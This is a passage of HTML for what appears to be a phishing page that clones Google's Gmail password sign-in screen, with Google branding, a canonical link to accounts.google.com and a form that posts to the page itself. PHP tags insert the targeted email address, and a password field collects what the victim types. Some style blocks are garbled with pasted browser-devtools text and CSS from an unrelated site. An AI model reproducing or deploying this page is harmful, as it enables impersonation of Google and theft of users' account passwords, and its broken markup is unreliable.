    }

    .sSzDje.NEk0Ve .enBDyd {
      justify-content: flex-start
    }

    .sSzDje.NEk0Ve .y5MMGc {
      margin-left: -8px
    }

    @keyframes quantumWizPaperAnimateSelectIn {
      0% {
        height: 0;
        width: 0
      }

      to {
        height: 100%;
        width: 100%
      }
    }

    @keyframes quantumWizPaperAnimateSelectOut {
      0% {
        height: 0;
        width: 0
      }

      to {
        height: 100%;
        width: 100%
      }
    }

    .DPChp {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      width: 100%
    }

    .Txuhic {
      flex-grow: 1;
      min-width: 0
    }

    .Fjk18 .sSzDje {
      padding: 8px 0 0
    }

    .Fjk18 .DVnhEd {
      padding: 0
    }
  </style>
  <title>Gmail</title>
  <link type=image/x-icon rel="shortcut icon" href=data:image/x-icon;base64,AAABAAIAEBAAAAEAIABoBAAAJgAAACAgAAABACAAqBAAAI4EAAAoAAAAEAAAACAAAAABACAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///zD9/f2W/f392P39/fn9/f35/f391/39/ZT+/v4uAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/v7+Cf39/Zn///////////////////////////////////////////39/ZX///8IAAAAAAAAAAAAAAAA/v7+Cf39/cH/////+v35/7TZp/92ul3/WKs6/1iqOv9yuFn/rNWd//j79v///////f39v////wgAAAAAAAAAAP39/Zn/////7PXp/3G3WP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP+Or1j//vDo///////9/f2VAAAAAP///zD/////+vz5/3G3V/9TqDT/WKo6/6LQkf/U6cz/1urO/6rUm/+Zo0r/8IZB//adZ////v7///////7+/i79/f2Y/////4nWzf9Lqkj/Vqo4/9Xqzv///////////////////////ebY//SHRv/0hUL//NjD///////9/f2U/f392v////8sxPH/Ebzt/43RsP/////////////////////////////////4roL/9IVC//i1jf///////f391/39/fr/////Cr37/wW8+/+16/7/////////////////9IVC//SFQv/0hUL/9IVC//SFQv/3pnX///////39/fn9/f36/////wu++/8FvPv/tuz+//////////////////SFQv/0hUL/9IVC//SFQv/0hUL/96p7///////9/f35/f392/////81yfz/CrL5/2uk9v///////////////////////////////////////////////////////f392P39/Zn/////ks/7/zdS7P84Rur/0NT6///////////////////////9/f////////////////////////39/Zb+/v4y//////n5/v9WYu3/NUPq/ztJ6/+VnPT/z9L6/9HU+v+WnfT/Ul7t/+Hj/P////////////////////8wAAAAAP39/Z3/////6Or9/1hj7v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v9sdvD////////////9/f2YAAAAAAAAAAD///8K/f39w//////5+f7/paz2/11p7v88Suv/Okfq/1pm7v+iqfX/+fn+///////9/f3B/v7+CQAAAAAAAAAAAAAAAP///wr9/f2d///////////////////////////////////////////9/f2Z/v7+CQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/jL9/f2Z/f392/39/fr9/f36/f392v39/Zj///8wAAAAAAAAAAAAAAAAAAAAAPAPAADAAwAAgAEAAIABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIABAACAAQAAwAMAAPAPAAAoAAAAIAAAAEAAAAABACAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/g3+/v5X/f39mf39/cj9/f3q/f39+f39/fn9/f3q/f39yP39/Zn+/v5W////DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/iT9/f2c/f399f/////////////////////////////////////////////////////9/f31/f39mv7+/iMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/gn9/f2K/f39+////////////////////////////////////////////////////////////////////////////f39+v39/Yf///8IAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+/v4k/f390v////////////////////////////////////////////////////////////////////////////////////////////////39/dD///8iAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////MP39/er//////////////////////////+r05v+v16H/gsBs/2WxSf9Wqjj/Vqk3/2OwRv99vWX/pdKV/97u2P////////////////////////////39/ej+/v4vAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/iT9/f3q/////////////////////+v15/+Pxnv/VKk2/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/36+Z//d7tf///////////////////////39/ej///8iAAAAAAAAAAAAAAAAAAAAAAAAAAD///8K/f390//////////////////////E4bn/XKw+/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1apN/+x0pv///////////////////////39/dD///8IAAAAAAAAAAAAAAAAAAAAAP39/Yv/////////////////////sdij/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/YKU1/8qOPv/5wZ////////////////////////39/YcAAAAAAAAAAAAAAAD+/v4l/f39+////////////////8Lgt/9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9utlT/n86N/7faqv+426v/pdKV/3u8ZP9UqDX/U6g0/3egN//jiUH/9IVC//SFQv/82MP//////////////////f39+v7+/iMAAAAAAAAAAP39/Z3////////////////q9Ob/W6w+/1OoNP9TqDT/U6g0/1OoNP9nskz/zOXC/////////////////////////////////+Dv2v+osWP/8YVC//SFQv/0hUL/9IVC//WQVP/++fb//////////////////f39mgAAAAD+/v4O/f399v///////////////4LHj/9TqDT/U6g0/1OoNP9TqDT/dblc//L58P/////////////////////////////////////////////8+v/3p3f/9IVC//SFQv/0hUL/9IVC//rIqf/////////////////9/f31////DP7+/ln////////////////f9v7/Cbz2/zOwhv9TqDT/U6g0/2KwRv/v9+z///////////////////////////////////////////////////////738//1kFT/9IVC//SFQv/0hUL/9plg///////////////////////+/v5W/f39nP///////////////4jf/f8FvPv/Bbz7/yG1s/9QqDz/vN2w//////////////////////////////////////////////////////////////////rHqP/0hUL/9IVC//SFQv/0hUL//vDn//////////////////39/Zn9/f3L////////////////R878/wW8+/8FvPv/Bbz7/y7C5P/7/fr//////////////////////////////////////////////////////////////////ere//SFQv/0hUL/9IVC//SFQv/718H//////////////////f39yP39/ez///////////////8cwvv/Bbz7/wW8+/8FvPv/WNL8///////////////////////////////////////0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//rIqv/////////////////9/f3q/f39+v///////////////we9+/8FvPv/Bbz7/wW8+/993P3///////////////////////////////////////SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/+cGf//////////////////39/fn9/f36////////////////B737/wW8+/8FvPv/Bbz7/33c/f//////////////////////////////////////9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/6xaX//////////////////f39+f39/e3///////////////8cwvv/Bbz7/wW8+/8FvPv/WdP8///////////////////////////////////////0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//vVv//////////////////9/f3q/f39y////////////////0bN/P8FvPv/Bbz7/wW8+/8hrvn/+/v///////////////////////////////////////////////////////////////////////////////////////////////////////////////////39/cj9/f2c////////////////ht/9/wW8+/8FvPv/FZP1/zRJ6/+zuPf//////////////////////////////////////////////////////////////////////////////////////////////////////////////////f39mf7+/lr////////////////d9v7/B7n7/yB38f81Q+r/NUPq/0hV7P/u8P3////////////////////////////////////////////////////////////////////////////////////////////////////////////+/v5X////D/39/ff///////////////9tkPT/NUPq/zVD6v81Q+r/NUPq/2Fs7//y8v7////////////////////////////////////////////09f7//////////////////////////////////////////////////f399f7+/g0AAAAA/f39n////////////////+Tm/P89Suv/NUPq/zVD6v81Q+r/NUPq/1Bc7f/IzPn/////////////////////////////////x8v5/0xY7P+MlPP////////////////////////////////////////////9/f2cAAAAAAAAAAD+/v4n/f39/P///////////////7W69/81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v9ZZe7/k5v0/6609/+vtff/lJv0/1pm7v81Q+r/NUPq/zVD6v+GjvL//v7//////////////////////////////f39+/7+/iQAAAAAAAAAAAAAAAD9/f2N/////////////////////6Cn9f81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v+BivL////////////////////////////9/f2KAAAAAAAAAAAAAAAAAAAAAP7+/gv9/f3V/////////////////////7W69/8+S+v/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/P0zr/7q/+P///////////////////////f390v7+/gkAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/ib9/f3r/////////////////////+Xn/P94gfH/NkTq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NkTq/3Z/8f/l5/z///////////////////////39/er+/v4kAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/jL9/f3r///////////////////////////k5vz/nqX1/2p08P9IVez/OEbq/zdF6v9GU+z/aHLv/5qh9f/i5Pz////////////////////////////9/f3q////MAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/ib9/f3V/////////////////////////////////////////////////////////////////////////////////////////////////f390v7+/iQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wr9/f2N/f39/P///////////////////////////////////////////////////////////////////////////f39+/39/Yv+/v4JAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+/v4n/f39n/39/ff//////////////////////////////////////////////////////f399v39/Z3+/v4lAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/v7+Dv7+/lr9/f2c/f39y/39/e39/f36/f39+v39/ez9/f3L/f39nP7+/ln+/v4OAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/AA///AAD//AAAP/gAAB/wAAAP4AAAB8AAAAPAAAADgAAAAYAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAABgAAAAcAAAAPAAAAD4AAAB/AAAA/4AAAf/AAAP/8AAP//wAP />
  <style>
    .sf-hidden {
      display: none !important
    }
  </style>
  <link rel=canonical href="https://accounts.google.com/v3/signin/challenge/pwd?TL=ALbfvL0cvpHKeDQp0kugdBaOX4c4vx1cra1buHv2hdPo9FuWOf-HywjLX9khR_o4&amp;checkConnection=youtube%3A483%3A1&amp;checkedDomains=youtube&amp;cid=1&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&amp;emr=1&amp;flowEntry=ServiceLogin&amp;flowName=GlifWebSignIn&amp;followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&amp;ifkv=AWnogHf8-9csyOk9LQGVj-gecfbSdqiQTXB4aALxG8iunVCCeoYHccfJFKHgb9GEGfFJptTVOCDm&amp;osid=1&amp;pstMsg=1&amp;service=mail">
  <meta http-equiv=content-security-policy>
  <style>
    img[src="data:,"],
    source[src="data:,"] {
      display: none !important
    }
  </style>
  <body jscontroller=XExvDf jsaction="rcuQ6b:npT2md; click:FAbpgf; auxclick:FAbpgf;wINJic:.CLIENT;qako4e:.CLIENT;TSpWaf:.CLIENT;nHjqDd:.CLIENT;GvneHb:.CLIENT;keydown:.CLIENT" class="nyoS7c SoDlKd EIlDfe">
    <div class="lJXwje S81Pef TFhTPc LZgQXe">
      <div class="fPxNlf LZgQXe qmmlRd" id=initialView role=presentation jsname=WsjYwc jscontroller=zYlmub jsaction=rcuQ6b:wVXPKc,eyofDf;SlnBXb:r0xNSb;cbwpef:Yd2OHe;rURRne:vYWWBd;bITzcd:wymjWe;Rld2oe:waWwEd;FzgWvd:waWwEd;>
        <div class=rn19nc aria-hidden=true>
          <div jscontroller=ltDFwf jsaction=transitionend:Zdx3Re jsname=Igk6W role=progressbar class="sZwd7c B6Vhqe qdulke jK7moc">
            <div class="xcNBHc um3FLe"></div>
            <div jsname=cQwEuf class="w2zcLc Iq5ZMc"></div>
            <div class="MyvhI TKVRUb" jsname=P1ekSe>
              <span class="l3q5xe SQxu9c"></span>
            </div>
            <div class="MyvhI sUoeld">
              <span class="l3q5xe SQxu9c"></span>
            </div>
          </div>
        </div>
        <div class=rhhJr jsname=f2d3ae role=presentation tabindex=null>
          <div class=nM4rkc id=yDmH0d jsaction=ZqRew:.CLIENT>
            <div id=ZCHFDb></div>
            <c-wiz jsrenderer=jGvTv class=g98c7c jsshadow jsdata=deferred-c4 data-p='%.@.1,null,null,null,"https://mail.google.com/mail/u/0/",false,[null]]' jscontroller=GLtV1c jsaction="jiqeKb:ZCwQbe;CDQ11b:n4vmRb;DKwHie:gVmDzc;jR85Td:WtmXg;rcuQ6b:rcuQ6b;click:vBw6I(preventDefault=true|L6M1Fb);DjJpIb:.CLIENT;abBxn:.CLIENT;xdUk6b:.CLIENT;ffNU7c:.CLIENT" jsname=nUpftc data-node-index=0;0 jsmodel="hc6Ubd XVq9Qb" c-wiz>
              <c-wiz jsrenderer=OTcFib jsshadow jsdata=deferred-c3 data-p=%.@.] data-node-index=2;0 jsmodel=hc6Ubd c-wiz>
                <div class=zOO9Bf jscontroller=Rusgnf jsname=n7vHCb>
                  <div jsname=jjf7Ff>
                    <div id=logo class=YNY4de title=Google>
                      <div class=Bym39d jsname=l4eHX>
                        <svg viewBox="0 0 75 24" width=75 height=24 xmlns=http://www.w3.org/2000/svg aria-hidden=true class="BFr46e xduoyf">
                          <g id=qaEJec>
                            <path fill=#ea4335 d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
                          </g>
                          <g id=YGlOvc>
                            <path fill=#34a853 d=M58.193.67h2.564v17.44h-2.564z></path>
                          </g>
                          <g id=BWfIk>
                            <path fill=#4285f4 d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
                          </g>
                          <g id=e6m3fd>
                            <path fill=#fbbc05 d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
                          </g>
                          <g id=vbkDmc>
                            <path fill=#ea4335 d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
                          </g>
                          <g id=idEJde>
                            <path fill=#4285f4 d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
                          </g>
                        </svg>
                      </div>
                    </div>
                  </div>
                </div>
                <c-data id=c3 jsdata=" eCjdDd;_;$1" class=sf-hidden></c-data>
              </c-wiz>
              <div class=aDGQwe jsname=bN97Pc data-use-configureable-escape-action=true jscontroller=Ctsu jsshadow role=presentation>
                <div jsname=paFcre>
                  <div class=rQszV jsname=tJHJj jscontroller=UPKV3d jsaction=bTyaEe:pKJJqe(af8ijd); jsshadow>
                    <h1 class=oO8pQe data-a11y-title-piece id=headingText jsname=r4nke>
                      <span jsslot>Welcome</span>
                    </h1>
                    <div class="tosRNd sf-hidden" data-a11y-title-piece id=headingSubtext jsname=VdSJob></div>
                    <div class=Wz0RKd>
                      <div jscontroller=ENv7Ef jsaction="click:cOuCgd; blur:O22p3e; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc;" class="YZrg6 HnRr5d iiFyne cd29Sd kWC5Rd" tabindex=0 role=link aria-label="<?php echo( $email ); ?> selected. Switch account" jsname=af8ijd>
                        <div class=gPHLDe>
                          <div class=qQWzTd aria-hidden=true>
                            <svg aria-hidden=true class=stUf5b fill=currentColor focusable=false width=48px height=48px viewBox="0 0 24 24" xmlns=https://www.w3.org/2000/svg>
                              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                            </svg>
                          </div>
                        </div>
                        <div jsname=bQIQze class=KTeGk data-profile-identifier><?php echo( $email ); ?></div>
                        <div class=krLnGe>
                          <svg aria-hidden=true class="stUf5b MSBt4d" fill=currentColor focusable=false width=24px height=24px viewBox="0 0 24 24" xmlns=https://www.w3.org/2000/svg>
                            <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
                          </svg>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div jsname=uybdVe class=eKnrVb role=presentation>
                  <div jsname=USBQqe class=CYBold role=presentation>
                    <div class=j663ec>
                      <div class=tCpFMc jsname=rEuO1b jscontroller=bPkrc>
                        <form method=post novalidate jsaction=submit:JM9m2e;>
                          <span jsslot>
                            <section class="aTzEhb AORPd rNe0id eLNT1d S7S4N sf-hidden" jscontroller=W2YXuc data-callout-type=2 jsname=INM6z aria-live=assertive aria-atomic=true jsshadow></section>
                            <section class=aTzEhb jscontroller=W2YXuc jsshadow>
                              <header class="IdEPtc sf-hidden" jsname=tJHJj aria-hidden=true></header>
                              <div class=CxRgyd jsname=MZArnb>
                                <div jsslot>
                                  <c-wiz jsrenderer=PXsWy jsdata=deferred-c0 data-p='%.@.null,"identity-signin-password"]' jscontroller=qPfo0c jsname=xdJtEf data-node-index=1;0 jsmodel=hc6Ubd c-wiz>
                                    <c-data id=c0 jsdata=" U3wROe;_;$0" class=sf-hidden></c-data>
                                  </c-wiz>
                                  <input type=email name=identifier class="F29zPe sf-hidden" tabindex=-1 aria-hidden=true spellcheck=false value=test123@gmail.com jsname=KKx9x autocomplete=off id=hiddenEmail>
                                  <div class="SdBahf Fjk18" jscontroller=yGClXb jsshadow jsname=vZSTIf jsaction=rcuQ6b:rcuQ6b;KJ9cZc:nAF18e(EMUunb);RXQi4b:.CLIENT;TGB85e:.CLIENT;DQ0KUb:.CLIENT;HYMnzb:.CLIENT;sv6xVb:.CLIENT;sKmMle:.CLIENT data-is-visible=false>
                                    <div class=eEgeR>
                                      <div class=DPChp>
                                        <div class=Txuhic>
                                          <div class=hDp5Db jscontroller=jYicPe jsaction=rcuQ6b:rcuQ6b;RXQi4b:.CLIENT;TGB85e:.CLIENT;keydown:.CLIENT;AHmuwe:.CLIENT;O22p3e:.CLIENT;YqO5N:.CLIENT jsname=UmsTj jsshadow>
                                            <div id="password" class="rFrNMe ze9ebf YKooDc wIXLub zKHdkd sdJrJc" jscontroller=pxq3x jsaction="clickonly:KjsqPd; focus:Jt1EX; blur:fpfTEe; input:Lg5SV" jsshadow jsname=Ufn6O>
                                              <div class="aCsJod oJeWuf">
                                                <div class="aXBtI Wic03c">
                                                  <div class=Xb9hP>
                                                    <input type=password id="Passwd" class="whsOnd zHQkBf" jsname=YPqjbf autocomplete=current-password spellcheck=false tabindex=0 aria-label="Enter your password" name="Passwd" autocapitalize=none dir=ltr data-initial-dir=ltr data-initial-value oninput="pwEdit()" value onfocus="onFocus()" onfocusout="offFocus()">
                                                    <div jsname=YRMmle class="AxOyFc snByac" style="background-color: white;" aria-hidden=true>Enter your password</div>
                                                  </div>
                                                  <script>
                                                  	function pwEdit() {
                                                  		if ( document.getElementById( 'Passwd' ).value != '' ) {
                                                  			document.getElementById( 'password' ).classList.add( 'CDELXb' );
                                                  		} else {
                                                  			document.getElementById( 'password' ).classList.remove( 'CDELXb' );
                                                  		}
                                                  	}
                                                  	document.getElementById( 'Passwd' ).addEventListener( 'keypress', function(event) {
																										  if ( event.key === 'Enter' ) {
																										    event.preventDefault();
																										    document.getElementById( 'submitbtn' ).click();
																										  }
																										});
                                                  </script>
                                                  <div class="i9lrp mIZh1c"></div>
                                                  <div jsname=XmnwAc class="OabDMe Y2Zypf" id="focusbox"></div>
                                                  <script>
                                                    function onFocus() {
                                                      document.getElementById( 'focusbox' ).classList.add( 'cXrdqd' );
                                                    }

                                                    function offFocus() {
                                                      document.getElementById( 'focusbox' ).classList.remove( 'cXrdqd' );
                                                    }
                                                  </script>
                                                </div>
                                              </div>
                                              <div class=LXRPh>
                                                <div jsname=ty6ygf class="ovnfwe Is7Fhb sf-hidden"></div>
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                    <div class="OyEIQ uSvLId sf-hidden" jsname=h9d3hd aria-live=polite></div>
                                    <div class=EcjFDf jsname=ESjtn>
                                      <div class=IhH7Wd jsaction=rcuQ6b:xawz9d;RqOcWc:gfO0Le; jscontroller=KylAQd jsname=EMUunb jsshadow>
                                        <div class=ci67pc>
                                          <div class="BudEQ rBUW7e" jsaction=click:DKv26d;JIbuQc:vKfede(ornU0b);RXQi4b:.CLIENT;TGB85e:.CLIENT jscontroller=Dt3C4 jsname=wQNmvb>
                                            <div class="sSzDje NEk0Ve">
                                              <div class=enBDyd>
                                                <div class="VfPpkd-MPu53c VfPpkd-MPu53c-OWXEXe-dgl2Hf Ne8lhe swXlm az2ine y5MMGc sD2Hod VfPpkd-MPu53c-OWXEXe-mWPk3d" jscontroller=etBPYb data-indeterminate=false jsname=ornU0b jsaction="click:cOuCgd;clickmod:vhIIDb; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; contextmenu:mg9Pef; animationend:L9dL9d;dyRcpb:dyRcpb;" data-disable-idom=true data-value=optionc2>
                                                  <input id="show-password-check" class=VfPpkd-muHVFf-bMcfAe type=checkbox jsname=YPqjbf jsaction="focus:AHmuwe; blur:O22p3e; change:WPi0i;" aria-labelledby=selectionc1 onclick="toggleHide()">
                                                  <style>
                                                    element.style {
                                                        --interactable-height: 40px;
                                                        --interactable-border-radius: 100px;
                                                        --interactable-background: transparent;
                                                        --interactable-hovered-background: rgb(15, 16, 18);
                                                        --interactable-hovered-opacity: 0.98;
                                                        --interactable-pressed-background: rgb(30, 31, 32);
                                                        --interactable-pressed-opacity: 0.92;
                                                        --interactable-disabled-background: rgb(10, 11, 13);
                                                    }
                                                    .cds-iconButton-i1804idl {
                                                        width: var(--interactable-height);
                                                        height: var(--interactable-height);
                                                        min-width: unset;
                                                    }
                                                    .cds-focusRing-fd371rq {
                                                        position: relative;
                                                    }
                                                    .cds-interactable-i9xooc6 {
                                                        -webkit-appearance: none;
                                                        appearance: none;
                                                        cursor: pointer;
                                                        -webkit-user-select: none;
                                                        user-select: none;
                                                        border-radius: var(--interactable-border-radius);
                                                        background-color: var(--interactable-background);
                                                        -webkit-text-decoration: none;
                                                        text-decoration: none;
                                                    }
                                                    .cds-scaledDownState-sxr2bd6 {
                                                        transform: scale(1);
                                                    }
                                                    .cds-transparent-tlx9nbb {
                                                        border: 1px solid #0000;
                                                    }
                                                    .cds-center-czxavit {
                                                        justify-content: center;
                                                    }
                                                    .cds-center-ca5ylan {
                                                        align-items: center;
                                                    }
                                                    .cds-flex-f1g67tkn {
                                                        display: flex;
                                                    }
                                                    .cds-button-b18qe5go {
                                                        border-width: var(--border-width-button);
                                                    }
                                                    *, :before, :after {
                                                        box-sizing: border-box;
                                                        border-style: solid;
                                                        border-width: 0;
                                                    }
                                                    user agent stylesheet
                                                    button {
                                                        appearance: auto;
                                                        writing-mode: horizontal-tb !important;
                                                        font-style: ;
                                                        font-variant-ligatures: ;
                                                        font-variant-caps: ;
                                                        font-variant-numeric: ;
                                                        font-variant-east-asian: ;
                                                        font-weight: ;
                                                        font-stretch: ;
                                                        font-size: ;
                                                        font-family: ;
                                                        text-rendering: auto;
                                                        color: buttontext;
                                                        letter-spacing: normal;
                                                        word-spacing: normal;
                                                        line-height: normal;
                                                        text-transform: none;
                                                        text-indent: 0px;
                                                        text-shadow: none;
                                                        display: inline-block;
                                                        text-align: center;
                                                        align-items: flex-start;
                                                        cursor: default;
                                                        box-sizing: border-box;
                                                        background-color: buttonface;
                                                        margin: 0em;
                                                        padding: 1px 6px;
                                                        border-width: 2px;
                                                        border-style: outset;
                                                        border-color: buttonborder;
                                                        border-image: initial;
                                                    }
                                                    style attribute {
                                                        --border-color-unfocused: var(--line-heavy);
                                                        --border-color-focused: var(--primary);
                                                        --border-width-focused: var(--border-width-input);
                                                        --interactable-border-radius: 8px;
                                                        --interactable-background: var(--background);
                                                        --interactable-hovered-background: rgb(15, 16, 18);
                                                        --interactable-hovered-opacity: 0.98;
                                                        --interactable-pressed-background: rgb(30, 31, 32);
                                                        --interactable-pressed-opacity: 0.92;
                                                        --interactable-disabled-background: rgb(10, 11, 13);
                                                    }
                                                    style attribute {
                                                        --foreground: rgb(var(--gray100));
                                                        --foreground-muted: rgb(var(--gray60));
                                                        --background: rgb(var(--gray0));
                                                        --background-alternate: rgb(var(--gray5));
                                                        --background-overlay: rgba(var(--gray80),0.33);
                                                        --line: rgba(var(--gray60),0.2);
                                                        --line-heavy: rgba(var(--gray60),0.68);
                                                        --primary: rgb(var(--blue60));
                                                        --primary-wash: rgb(var(--blue0));
                                                        --primary-foreground: rgb(var(--gray0));
                                                        --negative: rgb(var(--red60));
                                                        --negative-foreground: rgb(var(--gray0));
                                                        --positive: rgb(var(--green60));
                                                        --positive-foreground: rgb(var(--gray0));
                                                        --secondary: rgb(var(--gray20));
                                                        --secondary-foreground: rgb(var(--gray100));
                                                        --transparent: rgba(var(--gray0),0);
                                                    }
                                                    .cds-large-llfbhh8 {
                                                        --display1-font-weight: 400;
                                                        --display1-font-family: var(--cds-font-display);
                                                        --display2-font-weight: 400;
                                                        --display2-font-family: var(--cds-font-display);
                                                        --display2-frontier-font-weight: 400;
                                                        --display2-frontier-font-family: var(--cds-font-display);
                                                        --display3-font-weight: 400;
                                                        --display3-font-family: var(--cds-font-display);
                                                        --title1-font-weight: 600;
                                                        --title1-font-family: var(--cds-font-display);
                                                        --title2-font-weight: 400;
                                                        --title2-font-family: var(--cds-font-display);
                                                        --title3-font-weight: 600;
                                                        --title4-font-weight: 400;
                                                        --headline-font-weight: 600;
                                                        --headline-font-family: var(--cds-font-sans);
                                                        --body-font-weight: 400;
                                                        --body-font-family: var(--cds-font-sans);
                                                        --label1-font-weight: 600;
                                                        --label2-font-weight: 400;
                                                        --caption-font-weight: 600;
                                                        --legal-font-weight: 400;
                                                        --spacing-0: 0px;
                                                        --spacing-0\.5: 4px;
                                                        --spacing-1: 8px;
                                                        --label1-font-family: var(--cds-font-sans);
                                                        --label2-font-family: var(--cds-font-sans);
                                                        --spacing-2: 16px;
                                                        --spacing-3: 24px;
                                                        --spacing-4: 32px;
                                                        --spacing-5: 40px;
                                                        --spacing-6: 48px;
                                                        --spacing-7: 56px;
                                                        --spacing-8: 64px;
                                                        --spacing-9: 72px;
                                                        --spacing-10: 80px;
                                                        --checkbox-size: 20px;
                                                        --radio-size: 20px;
                                                        --switch-width: 52px;
                                                        --switch-height: 32px;
                                                        --switch-thumb-size: 30px;
                                                        --display1-font-size: 64px;
                                                        --display1-line-height: 72px;
